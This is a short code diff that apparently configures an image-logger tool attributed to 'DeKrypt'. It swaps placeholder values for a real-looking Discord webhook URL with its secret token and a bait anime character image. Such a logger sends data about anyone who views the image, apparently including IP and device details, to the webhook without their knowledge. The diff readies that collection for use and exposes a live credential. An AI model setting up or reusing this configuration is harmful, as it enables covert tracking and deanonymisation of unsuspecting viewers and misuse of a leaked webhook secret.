@@ -10,8 +10,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1376519441034252299/lMY6cy_guzpf7OIdqCYylcpTyfZoL1G0oYEdI8D2pCi7-tx4f6AUqi1pMutZKmbEjRVt ",
+    "image": "https://bluelock-anime-en.com/wp-content/themes/anime/assets/images/chara08.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
